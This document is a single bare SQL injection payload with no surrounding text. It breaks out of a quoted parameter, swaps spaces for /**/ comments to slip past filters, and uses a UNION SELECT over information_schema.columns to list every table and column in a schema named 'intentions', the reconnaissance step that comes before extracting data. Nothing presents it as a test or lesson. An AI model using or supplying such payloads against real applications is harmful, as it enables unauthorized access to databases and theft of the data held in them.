```
')/**/UNION/**/SELECT/**/1,/**/(SELECT/**/GROUP_CONCAT(CONCAT(TABLE_NAME,':',COLUMN_NAME))/**/FROM/**/information_schema.columns/**/WHERE/**/TABLE_SCHEMA/**/LIKE/**/'intentions'),3,4,5#
```